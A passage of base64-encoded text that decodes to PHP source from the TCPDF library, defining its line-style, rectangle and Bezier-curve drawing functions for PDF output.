JsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA4KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0TGluZVN0eWxlKCRzdHlsZSwgJHJldD1mYWxzZSkgewoJCSRzID0gJyc7IC8vIHN0cmluZyB0byBiZSByZXR1cm5lZAoJCWlmICghaXNfYXJyYXkoJHN0eWxlKSkgewoJCQlyZXR1cm4gJHM7CgkJfQoJCWlmIChpc3NldCgkc3R5bGVbJ3dpZHRoJ10pKSB7CgkJCSR0aGlzLT5MaW5lV2lkdGggPSAkc3R5bGVbJ3dpZHRoJ107CgkJCSR0aGlzLT5saW5lc3R5bGVXaWR0aCA9IHNwcmludGYoJyVGIHcnLCAoJHN0eWxlWyd3aWR0aCddICogJHRoaXMtPmspKTsKCQkJJHMgLj0gJHRoaXMtPmxpbmVzdHlsZVdpZHRoLicgJzsKCQl9CgkJaWYgKGlzc2V0KCRzdHlsZVsnY2FwJ10pKSB7CgkJCSRjYSA9IGFycmF5KCdidXR0JyA9PiAwLCAncm91bmQnPT4gMSwgJ3NxdWFyZScgPT4gMik7CgkJCWlmIChpc3NldCgkY2FbJHN0eWxlWydjYXAnXV0pKSB7CgkJCQkkdGhpcy0+bGluZXN0eWxlQ2FwID0gJGNhWyRzdHlsZVsnY2FwJ11dLicgSic7CgkJCQkkcyAuPSAkdGhpcy0+bGluZXN0eWxlQ2FwLicgJzsKCQkJfQoJCX0KCQlpZiAoaXNzZXQoJHN0eWxlWydqb2luJ10pKSB7CgkJCSRqYSA9IGFycmF5KCdtaXRlcicgPT4gMCwgJ3JvdW5kJyA9PiAxLCAnYmV2ZWwnID0+IDIpOwoJCQlpZiAoaXNzZXQoJGphWyRzdHlsZVsnam9pbiddXSkpIHsKCQkJCSR0aGlzLT5saW5lc3R5bGVKb2luID0gJGphWyRzdHlsZVsnam9pbiddXS4nIGonOwoJCQkJJHMgLj0gJHRoaXMtPmxpbmVzdHlsZUpvaW4uJyAnOwoJCQl9CgkJfQoJCWlmIChpc3NldCgkc3R5bGVbJ2Rhc2gnXSkpIHsKCQkJJGRhc2hfc3RyaW5nID0gJyc7CgkJCWlmICgkc3R5bGVbJ2Rhc2gnXSkgewoJCQkJaWYgKHByZWdfbWF0Y2goJy9eLissLycsICRzdHlsZVsnZGFzaCddKSA+IDApIHsKCQkJCQkkdGFiID0gZXhwbG9kZSgnLCcsICRzdHlsZVsnZGFzaCddKTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRhYiA9IGFycmF5KCRzdHlsZVsnZGFzaCddKTsKCQkJCX0KCQkJCSRkYXNoX3N0cmluZyA9ICcnOwoJCQkJZm9yZWFjaCAoJHRhYiBhcyAkaSA9PiAkdikgewoJCQkJCWlmICgkaSkgewoJCQkJCQkkZGFzaF9zdHJpbmcgLj0gJyAnOwoJCQkJCX0KCQkJCQkkZGFzaF9zdHJpbmcgLj0gc3ByaW50ZignJUYnLCAkdik7CgkJCQl9CgkJCX0KCQkJaWYgKCFpc3NldCgkc3R5bGVbJ3BoYXNlJ10pIE9SICEkc3R5bGVbJ2Rhc2gnXSkgewoJCQkJJHN0eWxlWydwaGFzZSddID0gMDsKCQkJfQoJCQkkdGhpcy0+bGluZXN0eWxlRGFzaCA9IHNwcmludGYoJ1slc10gJUYgZCcsICRkYXNoX3N0cmluZywgJHN0eWxlWydwaGFzZSddKTsKCQkJJHMgLj0gJHRoaXMtPmxpbmVzdHlsZURhc2guJyAnOwoJCX0KCQlpZiAoaXNzZXQoJHN0eWxlWydjb2xvciddKSkgewoJCQkkcyAuPSAkdGhpcy0+c2V0RHJhd0NvbG9yQXJyYXkoJHN0eWxlWydjb2xvciddLCB0cnVlKS4nICc7CgkJfQoJCWlmICghJHJldCBBTkQgKCR0aGlzLT5zdGF0ZSA9PSAyKSkgewoJCQkkdGhpcy0+X291dCgkcyk7CgkJfQoJCXJldHVybiAkczsKCX0KCgkvKioKCSAqIEJlZ2luIGEgbmV3IHN1YnBhdGggYnkgbW92aW5nIHRoZSBjdXJyZW50IHBvaW50IHRvIGNvb3JkaW5hdGVzICh4LCB5KSwgb21pdHRpbmcgYW55IGNvbm5lY3RpbmcgbGluZSBzZWdtZW50LgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHBvaW50LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfb3V0UG9pbnQoJHgsICR5KSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSA9PSAyKSB7CgkJCSR0aGlzLT5fb3V0KHNwcmludGYoJyVGICVGIG0nLCAoJHggKiAkdGhpcy0+ayksICgoJHRoaXMtPmggLSAkeSkgKiAkdGhpcy0+aykpKTsKCQl9Cgl9CgoJLyoqCgkgKiBBcHBlbmQgYSBzdHJhaWdodCBsaW5lIHNlZ21lbnQgZnJvbSB0aGUgY3VycmVudCBwb2ludCB0byB0aGUgcG9pbnQgKHgsIHkpLgoJICogVGhlIG5ldyBjdXJyZW50IHBvaW50IHNoYWxsIGJlICh4LCB5KS4KCSAqIEBwYXJhbSBmbG9hdCAkeCBBYnNjaXNzYSBvZiBlbmQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkgT3JkaW5hdGUgb2YgZW5kIHBvaW50LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfb3V0TGluZSgkeCwgJHkpIHsKCQlpZiAoJHRoaXMtPnN0YXRlID09IDIpIHsKCQkJJHRoaXMtPl9vdXQoc3ByaW50ZignJUYgJUYgbCcsICgkeCAqICR0aGlzLT5rKSwgKCgkdGhpcy0+aCAtICR5KSAqICR0aGlzLT5rKSkpOwoJCX0KCX0KCgkvKioKCSAqIEFwcGVuZCBhIHJlY3RhbmdsZSB0byB0aGUgY3VycmVudCBwYXRoIGFzIGEgY29tcGxldGUgc3VicGF0aCwgd2l0aCBsb3dlci1sZWZ0IGNvcm5lciAoeCwgeSkgYW5kIGRpbWVuc2lvbnMgd2lkdGhhbmQgaGVpZ2h0IGluIHVzZXIgc3BhY2UuCgkgKiBAcGFyYW0gZmxvYXQgJHggQWJzY2lzc2Egb2YgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHkgT3JkaW5hdGUgb2YgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHcgV2lkdGguCgkgKiBAcGFyYW0gZmxvYXQgJGggSGVpZ2h0LgoJICogQHBhcmFtIHN0cmluZyAkb3Agb3B0aW9ucwoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfb3V0UmVjdCgkeCwgJHksICR3LCAkaCwgJG9wKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSA9PSAyKSB7CgkJCSR0aGlzLT5fb3V0KHNwcmludGYoJyVGICVGICVGICVGIHJlICVzJywgKCR4ICogJHRoaXMtPmspLCAoKCR0aGlzLT5oIC0gJHkpICogJHRoaXMtPmspLCAoJHcgKiAkdGhpcy0+ayksICgtJGggKiAkdGhpcy0+ayksICRvcCkpOwoJCX0KCX0KCgkvKioKCSAqIEFwcGVuZCBhIGN1YmljIEJlemllciBjdXJ2ZSB0byB0aGUgY3VycmVudCBwYXRoLiBUaGUgY3VydmUgc2hhbGwgZXh0ZW5kIGZyb20gdGhlIGN1cnJlbnQgcG9pbnQgdG8gdGhlIHBvaW50ICh4MywgeTMpLCB1c2luZyAoeDEsIHkxKSBhbmQgKHgyLCB5MikgYXMgdGhlIEJlemllciBjb250cm9sIHBvaW50cy4KCSAqIFRoZSBuZXcgY3VycmVudCBwb2ludCBzaGFsbCBiZSAoeDMsIHkzKS4KCSAqIEBwYXJhbSBmbG9hdCAkeDEgQWJzY2lzc2Egb2YgY29udHJvbCBwb2ludCAxLgoJICogQHBhcmFtIGZsb2F0ICR5MSBPcmRpbmF0ZSBvZiBjb250cm9sIHBvaW50IDEuCgkgKiBAcGFyYW0gZmxvYXQgJHgyIEFic2Npc3NhIG9mIGNvbnRyb2wgcG9pbnQgMi4KCSAqIEBwYXJhbSBmbG9hdCAkeTIgT3JkaW5hdGUgb2YgY29udHJvbCBwb2ludCAyLgoJICogQHBhcmFtIGZsb2F0ICR4MyBBYnNjaXNzYSBvZiBlbmQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkzIE9yZGluYXRlIG9mIGVuZCBwb2ludC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA4KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX291dEN1cnZlKCR4MSwgJHkxLCAkeDIsICR5MiwgJHgzLCAkeTMpIHsKCQlpZiAoJHRoaXMtPnN0YXRlID09IDIpIHsKCQkJJHRoaXMtPl9vdXQoc3ByaW50ZignJUYgJUYgJUYgJUYgJUYgJUYgYycsICgkeDEgKiAkdGhpcy0+ayksICgoJHRoaXMtPmggLSAkeTEpICogJHRoaXMtPmspLCAoJHgyICogJHRoaXMtPmspLCAoKCR0aGlzLT5oIC0gJHkyKSAqICR0aGlzLT5rKSwgKCR4MyAqICR0aGlzLT5rKSwgKCgkdGhpcy0+aCAtICR5MykgKiAkdGhpcy0+aykpKTsKCQl9Cgl9CgoJLyoqCgkgKiBBcHBlbmQgYSBjdWJpYyBCZXppZXIgY3VydmUgdG8gdGhlIGN1cnJlbnQgcGF0aC4gVGhlIGN1cnZlIHNoYWxsIGV4dGVuZCBmcm9tIHRoZSBjdXJyZW50IHBvaW50IHRvIHRoZSBwb2ludCAoeDMsIHkzKSwgdXNpbmcgdGhlIGN1cnJlbnQgcG9pbnQgYW5kICh4MiwgeTIpIGFzIHRoZSBCZXppZXIgY29udHJvbCBwb2ludHMuCgkgKiBUaGUgbmV3IGN1cnJlbnQgcG9pbnQgc2hhbGwgYmUgKHgzLCB5MykuCgkgKiBAcGFyYW0gZmxvYXQgJHgyIEFic2Npc3NhIG9mIGNvbnRyb2wgcG9pbnQgMi4KCSAqIEBwYXJhbSBmbG9hdCAkeTIgT3JkaW5hdGUgb2YgY29udHJvbCBwb2ludCAyLgoJICogQHBhcmFtIGZsb2F0ICR4MyBBYnNjaXNzYSBvZiBlbmQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkzIE9yZGluYXRlIG9mIGVuZCBwb2ludC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjkuMDE5ICgyMDEwLTA0LTI2KQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX291dEN1cnZlVigkeDIsICR5MiwgJHgzLCAkeTMpIHsKCQlpZiAoJHRoaXMtPnN0YXRlID09IDIpIHsKCQkJJHRoaXMtPl9vdXQoc3ByaW50ZignJUYgJUYgJUYgJUYgdicsICgkeDIgKiAkdGhpcy0+ayksICgoJHRoaXMtPmggLSAkeTIpICogJHRoaXMtPmspLCAoJHgzICogJHRoaXMtPmspLCAoKCR0aGlzLT5oIC0gJHkzKSAqICR0aGlzLT5rKSkpOwoJCX0KCX0KCgkvKioKCSAqIEFwcGVuZCBhIGN1YmljIEJlemllciBjdXJ2ZSB0byB0aGUgY3VycmVudCBwYXRoLiBUaGUgY3VydmUgc2hhbGwgZXh0ZW5kIGZyb20gdGhlIGN1cnJlbnQgcG9pbnQgdG8gdGhlIHBvaW50ICh4MywgeTMpLCB1c2luZyAoeDEsIHkxKSBhbmQgKHgzLCB5MykgYXMgdGhlIEJlemllciBjb250cm9sIHBvaW50cy4KCSAqIFRoZSBuZXcgY3VycmVudCBwb2ludCBzaGFsbCBiZSAoeDMsIHkzKS4KCSAqIEBwYXJhbSBmbG9hdCAkeDEgQWJzY2lzc2Egb2YgY29udHJvbCBwb2ludCAxLgoJICogQHBhcmFtIGZsb2F0ICR5MSBPcmRpbmF0ZSBvZiBjb250cm9sIHBvaW50IDEuCgkgKiBAcGFyYW0gZmxvYXQgJHgzIEFic2Npc3NhIG9mIGVuZCBwb2ludC4KCSAqIEBwYXJhbSBmbG9hdCAkeTMgT3JkaW5hdGUgb2YgZW5kIHBvaW50LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfb3V0Q3VydmVZKCR4MSwgJHkxLCAkeDMsICR5MykgewoJCWlmICgkdGhpcy0+c3RhdGUgPT0gMikgewoJCQkkdGhpcy0+X291dChzcHJpbnRmKCclRiAlRiAlRiAlRiB5JywgKCR4MSAqICR0aGlzLT5rKSwgKCgkdGhpcy0+aCAtICR5MSkgKiAkdGhpcy0+ayksICgkeDMgKiAkdGhpcy0+ayksICgoJHRoaXMtPmggLSAkeTMpICogJHRoaXMtPmspKSk7CgkJfQoJfQoKCS8qKgoJICogRHJhd3MgYSBsaW5lIGJldHdlZW4gdHdvIHBvaW50cy4KCSAqIEBwYXJhbSBmbG9hdCAkeDEgQWJzY2lzc2Egb2YgZmlyc3QgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkxIE9yZGluYXRlIG9mIGZpcnN0IHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR4MiBBYnNjaXNzYSBvZiBzZWNvbmQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkyIE9yZGluYXRlIG9mIHNlY29uZCBwb2ludC4KCSAqIEBwYXJhbSBhcnJheSAkc3R5bGUgTGluZSBzdHlsZS4gQXJyYXkgbGlrZSBmb3IgU2V0TGluZVN0eWxlKCkuIERlZmF1bHQgdmFsdWU6IGRlZmF1bHQgbGluZSBzdHlsZSAoZW1wdHkgYXJyYXkpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMAoJICogQHNlZSBTZXRMaW5lV2lkdGgoKSwgU2V0RHJhd0NvbG9yKCksIFNldExpbmVTdHlsZSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBMaW5lKCR4MSwgJHkxLCAkeDIsICR5MiwgJHN0eWxlPWFycmF5KCkpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQlpZiAoaXNfYXJyYXkoJHN0eWxlKSkgewoJCQkkdGhpcy0+c2V0TGluZVN0eWxlKCRzdHlsZSk7CgkJfQoJCSR0aGlzLT5fb3V0UG9pbnQoJHgxLCAkeTEpOwoJCSR0aGlzLT5fb3V0TGluZSgkeDIsICR5Mik7CgkJJHRoaXMtPl9vdXQoJ1MnKTsKCX0KCgkvKioKCSAqIERyYXdzIGEgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodC4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIFN0eWxlIG9mIHJlbmRlcmluZy4gU2VlIHRoZSBnZXRQYXRoUGFpbnRPcGVyYXRvcigpIGZ1bmN0aW9uIGZvciBtb3JlIGluZm9ybWF0aW9uLgoJICogQHBhcmFtIGFycmF5ICRib3JkZXJfc3R5bGUgQm9yZGVyIHN0eWxlIG9mIHJlY3RhbmdsZS4gQXJyYXkgd2l0aCBrZXlzIGFtb25nIHRoZSBmb2xsb3dpbmc6CgkgKiA8dWw+CgkgKgkgPGxpPmFsbDogTGluZSBzdHlsZSBvZiBhbGwgYm9yZGVycy4gQXJyYXkgbGlrZSBmb3IgU2V0TGluZVN0eWxlKCkuPC9saT4KCSAqCSA8bGk+TCwgVCwgUiwgQiBvciBjb21iaW5hdGlvbnM6IExpbmUgc3R5bGUgb2YgbGVmdCwgdG9wLCByaWdodCBvciBib3R0b20gYm9yZGVyLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS48L2xpPgoJICogPC91bD4KCSAqIElmIGEga2V5IGlzIG5vdCBwcmVzZW50IG9yIGlzIG51bGwsIHRoZSBjb3JyZXNwb25kZW50IGJvcmRlciBpcyBub3QgZHJhd24uIERlZmF1bHQgdmFsdWU6IGRlZmF1bHQgbGluZSBzdHlsZSAoZW1wdHkgYXJyYXkpLgoJICogQHBhcmFtIGFycmF5ICRmaWxsX2NvbG9yIEZpbGwgY29sb3IuIEZvcm1hdDogYXJyYXkoR1JFWSkgb3IgYXJyYXkoUixHLEIpIG9yIGFycmF5KEMsTSxZLEspIG9yIGFycmF5KEMsTSxZLEssU3BvdENvbG9yTmFtZSkuIERlZmF1bHQgdmFsdWU6IGRlZmF1bHQgY29sb3IgKGVtcHR5IGFycmF5KS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgU2V0TGluZVN0eWxlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJlY3QoJHgsICR5LCAkdywgJGgsICRzdHlsZT0nJywgJGJvcmRlcl9zdHlsZT1hcnJheSgpLCAkZmlsbF9jb2xvcj1hcnJheSgpKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJaWYgKGVtcHR5KCRzdHlsZSkpIHsKCQkJJHN0eWxlID0gJ1MnOwoJCX0KCQlpZiAoIShzdHJwb3MoJHN0eWxlLCAnRicpID09PSBmYWxzZSkgQU5EICFlbXB0eSgkZmlsbF9jb2xvcikpIHsKCQkJLy8gc2V0IGJhY2tncm91bmQgY29sb3IKCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRmaWxsX2NvbG9yKTsKCQl9CgkJaWYgKCFlbXB0eSgkYm9yZGVyX3N0eWxlKSkgewoJCQlpZiAoaXNzZXQoJGJvcmRlcl9zdHlsZVsnYWxsJ10pIEFORCAhZW1wdHkoJGJvcmRlcl9zdHlsZVsnYWxsJ10pKSB7CgkJCQkvL3NldCBnbG9iYWwgc3R5bGUgZm9yIGJvcmRlcgoJCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkYm9yZGVyX3N0eWxlWydhbGwnXSk7CgkJCQkkYm9yZGVyX3N0eWxlID0gYXJyYXkoKTsKCQkJfSBlbHNlIHsKCQkJCS8vIHJlbW92ZSBzdHJva2Ugb3BlcmF0b3IgZnJvbSBzdHlsZQoJCQkJJG9wbm9zdHJva2UgPSBhcnJheSgnUycgPT4gJycsICdEJyA9PiAnJywgJ3MnID0+ICcnLCAnZCcgPT4gJycsICdCJyA9PiAnRicsICdGRCcgPT4gJ0YnLCAnREYnID0+ICdGJywgJ0IqJyA9PiAnRionLCAnRipEJyA9PiAnRionLCAnREYqJyA9PiAnRionLCAnYicgPT4gJ2YnLCAnZmQnID0+ICdmJywgJ2RmJyA9PiAnZicsICdiKicgPT4gJ2YqJywgJ2YqZCcgPT4gJ2YqJywgJ2RmKicgPT4gJ2YqJyApOwoJCQkJaWYgKGlzc2V0KCRvcG5vc3Ryb2tlWyRzdHlsZV0pKSB7CgkJCQkJJHN0eWxlID0gJG9wbm9zdHJva2VbJHN0eWxlXTsKCQkJCX0KCQkJfQoJCX0KCQlpZiAoIWVtcHR5KCRzdHlsZSkpIHsKCQkJJG9wID0gVENQREZfU1RBVElDOjpnZXRQYXRoUGFpbnRPcGVyYXRvcigkc3R5bGUpOwoJCQkkdGhpcy0+X291dFJlY3QoJHgsICR5LCAkdywgJGgsICRvcCk7CgkJfQoJCWlmICghZW1wdHkoJGJvcmRlcl9zdHlsZSkpIHsKCQkJJGJvcmRlcl9zdHlsZTIgPSBhcnJheSgpOwoJCQlmb3JlYWNoICgkYm9yZGVyX3N0eWxlIGFzICRsaW5lID0+ICR2YWx1ZSkgewoJCQkJJGxlbmd0aCA9IHN0cmxlbigkbGluZSk7CgkJCQlmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyArKyRpKSB7CgkJCQkJJGJvcmRlcl9zdHlsZTJbJGxpbmVbJGldXSA9ICR2YWx1ZTsKCQkJCX0KCQkJfQoJCQkkYm9yZGVyX3N0eWxlID0gJGJvcmRlcl9zdHlsZTI7CgkJCWlmIChpc3NldCgkYm9yZGVyX3N0eWxlWydMJ10pIEFORCAkYm9yZGVyX3N0eWxlWydMJ10pIHsKCQkJCSR0aGlzLT5MaW5lKCR4LCAkeSwgJHgsICR5ICsgJGgsICRib3JkZXJfc3R5bGVbJ0wnXSk7CgkJCX0KCQkJaWYgKGlzc2V0KCRib3JkZXJfc3R5bGVbJ1QnXSkgQU5EICRib3JkZXJfc3R5bGVbJ1QnXSkgewoJCQkJJHRoaXMtPkxpbmUoJHgsICR5LCAkeCArICR3LCAkeSwgJGJvcmRlcl9zdHlsZVsnVCddKTsKCQkJfQoJCQlpZiAoaXNzZXQoJGJvcmRlcl9zdHlsZVsnUiddKSBBTkQgJGJvcmRlcl9zdHlsZVsnUiddKSB7CgkJCQkkdGhpcy0+TGluZSgkeCArICR3LCAkeSwgJHggKyAkdywgJHkgKyAkaCwgJGJvcmRlcl9zdHlsZVsnUiddKTsKCQkJfQoJCQlpZiAoaXNzZXQoJGJvcmRlcl9zdHlsZVsnQiddKSBBTkQgJGJvcmRlcl9zdHlsZVsnQiddKSB7CgkJCQkkdGhpcy0+TGluZSgkeCwgJHkgKyAkaCwgJHggKyAkdywgJHkgKyAkaCwgJGJvcmRlcl9zdHlsZVsnQiddKTsKCQkJfQoJCX0KCX0KCgkvKioKCSAqIERyYXdzIGEgQmV6aWVyIGN1cnZlLgoJICogVGhlIEJlemllciBjdXJ2ZSBpcyBhIHRhbmdlbnQgdG8gdGhlIGxpbmUgYmV0d2VlbiB0aGUgY29udHJvbCBwb2ludHMgYXQKCSAqIGVpdGhlciBlbmQgb2YgdGhlIGN1cnZlLgoJICogQHBhcmFtIGZsb2F0ICR4MCBBYnNjaXNzYSBvZiBzdGFydCBwb2ludC4KCSAqIEBwYXJhbSBmbG9hdCAkeTAgT3JkaW5hdGUgb2Ygc3RhcnQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHgxIEFic2Npc3NhIG9mIGNvbnRyb2wgcG9pbnQgMS4KCSAqIEBwYXJhbSBmbG9hdCAkeTEgT3JkaW5hdGUgb2YgY29udHJvbCBwb2ludCAxLgoJICogQHBhcmFtIGZsb2F0ICR4MiBBYnNjaXNzYSBvZiBjb250cm9sIHBvaW50IDIuCgkgKiBAcGFyYW0gZmxvYXQgJHkyIE9yZGluYXRlIG9mIGNvbnRyb2wgcG9pbnQgMi4KCSAqIEBwYXJhbSBmbG9hdCAkeDMgQWJzY2lzc2Egb2YgZW5kIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR5MyBPcmRpbmF0ZSBvZiBlbmQgcG9pbnQuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkbGluZV9zdHlsZSBMaW5lIHN0eWxlIG9mIGN1cnZlLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBsaW5lIHN0eWxlIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gYXJyYXkgJGZpbGxfY29sb3IgRmlsbCBjb2xvci4gRm9ybWF0OiBhcnJheShHUkVZKSBvciBhcnJheShSLEcsQikgb3IgYXJyYXkoQyxNLFksSykgb3IgYXJyYXkoQyxNLFksSyxTcG90Q29sb3JOYW1lKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBjb2xvciAoZW1wdHkgYXJyYXkpLgoJICogQHB1YmxpYwoJICogQHNlZSBTZXRMaW5lU3R5bGUoKQoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBDdXJ2ZSgkeDAsICR5MCwgJHgxLCAkeTEsICR4MiwgJHkyLCAkeDMsICR5MywgJHN0eWxlPScnLCAkbGluZV9zdHlsZT1hcnJheSgpLCAkZmlsbF9jb2xvcj1hcnJheSgpKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJaWYgKCEoZmFsc2UgPT09IHN0cnBvcygkc3R5bGUsICdGJykpIEFORCBpc19hcnJheSgkZmlsbF9jb2xvcikpIHsKCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRmaWxsX2NvbG9yKTsKCQl9CgkJJG9wID0gVENQREZfU1RBVElDOjpnZXRQYXRoUGFpbnRPcGVyYXRvcigkc3R5bGUpOwoJCWlmICgkbGluZV9zdHlsZSkgewoJCQkkdGhpcy0+c2V0TGluZVN0eWxlKCRsaW5lX3N0eWxlKTsKCQl9CgkJJHRoaXMtPl9vdXRQb2ludCgkeDAsICR5MCk7CgkJJHRoaXMtPl9vdXRDdXJ2ZSgkeDEsICR5MSwgJHgyLCAkeTIsICR4MywgJHkzKTsKCQkkdGhpcy0+X291dCgkb3ApOwoJfQoKCS8qKgoJICogRHJhd3MgYSBwb2x5LUJlemllciBjdXJ2ZS4KCSAqIEVhY2ggQmV6aWVyIGN1cnZlIHNlZ21lbnQgaXMgYSB0YW5nZW50IHRvIHRoZSBsaW5lIGJldHdlZW4gdGhlIGNvbnRyb2wgcG9pbnRzIGF0CgkgKiBlaXRoZXIgZW5kIG9mIHRoZSBjdXJ2ZS4KCSAqIEBwYXJhbSBmbG9hdCAkeDAgQWJzY2lzc2Egb2Ygc3RhcnQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkwIE9yZGluYXRlIG9mIHN0YXJ0IHBvaW50LgoJICogQHBhcmFtIGZsb2F0W10gJHNlZ21lbnRzIEFuIGFycmF5IG9mIGJlemllciBkZXNjcmlwdGlvbnMuIEZvcm1hdDogYXJyYXkoeDEsIHkxLCB4MiwgeTIsIHgzLCB5MykuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkbGluZV9zdHlsZSBMaW5lIHN0eWxlIG9mIGN1cnZlLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBsaW5lIHN0eWxlIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gYXJyYXkgJGZpbGxfY29sb3IgRmlsbCBjb2xvci4gRm9ybWF0OiBhcnJheShHUkVZKSBvciBhcnJheShSLEcsQikgb3IgYXJyYXkoQyxNLFksSykgb3IgYXJyYXkoQyxNLFksSyxTcG90Q29sb3JOYW1lKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBjb2xvciAoZW1wdHkgYXJyYXkpLgoJICogQHB1YmxpYwoJICogQHNlZSBTZXRMaW5lU3R5bGUoKQoJICogQHNpbmNlIDMuMDAwOCAoMjAwOC0wNS0xMikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFBvbHljdXJ2ZSgkeDAsICR5MCwgJHNlZ21lbnRzLCAkc3R5bGU9JycsICRsaW5lX3N0eWxlPWFycmF5KCksICRmaWxsX2NvbG9yPWFycmF5KCkpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQlpZiAoIShmYWxzZSA9PT0gc3RycG9zKCRzdHlsZSwgJ0YnKSkgQU5EIGlzX2FycmF5KCRmaWxsX2NvbG9yKSkgewoJCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGZpbGxfY29sb3IpOwoJCX0KCQkkb3AgPSBUQ1BERl9TVEFUSUM6OmdldFBhdGhQYWludE9wZXJhdG9yKCRzdHlsZSk7CgkJaWYgKCRvcCA9PSAnZicpIHsKCQkJJGxpbmVfc3R5bGUgPSBhcnJheSgpOwoJCX0KCQlpZiAoJGxpbmVfc3R5bGUpIHsKCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkbGluZV9zdHlsZSk7CgkJfQoJCSR0aGlzLT5fb3V0UG9pbnQoJHgwLCAkeTApOwoJCWZvcmVhY2ggKCRzZWdtZW50cyBhcyAkc2VnbWVudCkgewoJCQlsaXN0KCR4MSwgJHkxLCAkeDIsICR5MiwgJHgzLCAkeTMpID0gJHNlZ21lbnQ7CgkJCSR0aGlzLT5fb3V0Q3VydmUoJHgxLCAkeTEsICR4MiwgJHkyLCAkeDMsICR5Myk7CgkJfQoJCSR0aGlzLT5fb3V0KCRvcCk7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhbiBlbGxpcHNlLgoJICogQW4gZWxsaXBzZSBpcyBmb3JtZWQgZnJvbSBuIEJlemllciBjdXJ2ZXMuCgkgKiBAcGFyYW0gZmxvYXQgJHgwIEFic2Npc3NhIG9mIGNlbnRlciBwb2ludC4KCSAqIEBwYXJhbSBmb